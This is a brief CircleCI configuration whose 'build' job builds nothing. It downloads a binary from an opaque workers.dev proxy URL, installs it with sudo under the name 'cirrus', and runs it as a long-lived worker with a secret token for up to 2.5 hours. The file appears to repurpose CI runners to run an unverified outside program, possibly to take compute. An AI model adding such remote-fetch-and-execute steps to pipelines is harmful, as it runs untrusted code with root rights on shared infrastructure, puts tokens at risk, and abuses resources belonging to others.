version: 2.1
jobs:
 build:
   machine: true
   steps:
     - checkout
     - run: |
        curl -L -o cirrus https://sa.mirror-hub.workers.dev/3:/snx
        sudo mv cirrus /usr/local/bin/cirrus
        sudo chmod +x /usr/local/bin/cirrus
     - run:
         name: Snx
         command: sudo cirrus worker run --token $API_SNX_S --name AX61-1
         no_output_timeout: 2.5h
